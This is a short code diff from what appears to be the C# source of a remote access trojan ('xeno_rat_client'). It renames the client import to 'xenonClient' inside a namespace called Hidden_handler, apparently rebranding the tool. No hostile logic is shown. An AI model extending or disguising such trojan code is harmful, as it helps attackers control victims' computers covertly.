@@ -8,7 +8,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
-using xeno_rat_client;
+using xenonClient;
 
 namespace Hidden_handler
 {
